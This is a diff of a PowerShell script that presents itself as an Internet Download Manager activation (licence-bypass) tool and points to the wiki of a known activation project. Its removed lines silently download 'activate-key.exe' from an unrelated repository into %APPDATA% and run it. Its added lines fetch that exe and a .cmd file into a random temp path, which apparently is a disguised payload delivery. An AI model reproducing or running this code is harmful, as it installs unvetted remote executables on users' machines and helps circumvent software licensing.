@@ -1,22 +1,19 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
-$ProcName = "activate-key.exe"
-$WebFile = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
- 
-Clear-Host
- 
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
-Start-Process ("$env:APPDATA\$ProcName")
+
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
+$DownloadURLx = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe'
 $DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/IDM-Lifetime-license.cmd'
+
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IAS_$rand.cmd" }
 
 try {
+    $response = Invoke-WebRequest -Uri $DownloadURLx -UseBasicParsing
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
 }
 catch {
